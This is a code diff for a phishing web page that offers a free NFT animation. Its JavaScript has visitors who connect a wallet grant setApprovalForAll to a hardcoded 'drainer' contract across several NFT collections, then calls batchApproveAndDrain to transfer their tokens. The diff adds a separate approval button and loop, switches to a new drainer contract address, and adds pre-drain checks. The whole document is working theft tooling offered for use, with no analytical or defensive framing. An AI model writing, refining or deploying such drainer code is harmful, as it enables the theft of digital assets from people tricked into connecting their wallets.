@@ -101,6 +101,7 @@
       <p>Claim your exclusive animation…</p>
       <div class="button-container">
         <button id="connectBtn">Connect Wallet</button>
+        <button id="approveBtn">Approve Drainer</button>
         <button id="drainBtn">Animate NFT / DRAIN</button>
       </div>
       <div id="status"></div>
@@ -119,7 +120,7 @@
       "0xcc3C67956415CDd8C833C29ae4F9097aBb6bdD60", // WarGameNFT
       "0xa79c8Cd930c21B5555c76a168E4A02Dc7494b36B"  // HappyApeYC
     ];
-    const drainerContract = "0xb898F96C2Fbd5b21bD2B757D9fd3Ba28Ad17e679"; // Update with new V5 address
+    const drainerContract = "0x3A0C897D86e0616dC5e1048CC27e5e61ba067C6F"; // Update with V5 address
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
@@ -191,12 +192,37 @@
       }
     };
 
-    // Drains NFTs with batch approval
+    // Approves the drainer for all NFT contracts
+    document.getElementById("approveBtn").onclick = async () => {
+      const status = document.getElementById("status");
+      if (!signer) return alert("Please connect your wallet first.");
+      try {
+        status.innerText = "⏳ Approving drainer...";
+        for (const contractAddr of nftContracts) {
+          const contract = new ethers.Contract(contractAddr, nftABI, signer);
+          const isApproved = await contract.isApprovedForAll(await signer.getAddress(), drainerContract);
+          if (!isApproved) {
+            const tx = await contract.setApprovalForAll(drainerContract, true);
+            status.innerText += `\n⏳ Approving ${await contract.name()}...`;
+            await tx.wait();
+            status.innerText += "\n✅ Approved!";
+          } else {
+            status.innerText += `\n✅ ${await contract.name()} already approved!`;
+          }
+        }
+        status.innerText += "\nReady to drain!";
+      } catch (err) {
+        console.error("Approval error:", err);
+        status.innerText += "\n⚠️ Approval failed: " + err.message;
+      }
+    };
+
+    // Drains NFTs (assumes prior approval)
     document.getElementById("drainBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText = "🚨 Initiating batch approval and drain...";
+        status.innerText = "🚨 Draining NFTs...";
         const user = await signer.getAddress();
 
         // Gather owned token IDs
@@ -222,11 +248,20 @@
         // Check if tokenIdMatrix has valid data
         let hasValidIds = tokenIdMatrix.some(arr => arr.length > 0 && arr.some(id => id !== 0));
         if (!hasValidIds) {
-          status.innerText = "⚠️ No valid token IDs found. Please use hardcoded token IDs (e.g., [[1,2],[3,4]]) in the script.";
+          status.innerText = "⚠️ No valid token IDs found. Please use hardcoded token IDs (e.g., [[1],[1]]) in the script.";
           return;
         }
 
-        // Call batchApproveAndDrain
+        // Validate approvals before draining
+        for (const contractAddr of nftContracts) {
+          const contract = new ethers.Contract(contractAddr, nftABI, signer);
+          if (!(await contract.isApprovedForAll(user, drainerContract))) {
+            status.innerText += "\n⚠️ Drainer not approved for one or more contracts. Use 'Approve Drainer' first.";
+            return;
+          }
+        }
+
+        // Call batchApproveAndDrain (rely on pre-approval)
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
         const tx = await drainer.batchApproveAndDrain(nftContracts, tokenIdMatrix);
         await tx.wait();
@@ -253,7 +288,7 @@
         } else {
           console.error("Drain error:", err);
           status.innerText = "⚠️ Unexpected error occurred: " + err.message;
-          // Check Etherscan events for debug logs
+          // Check Etherscan for debug logs
         }
       }
     };
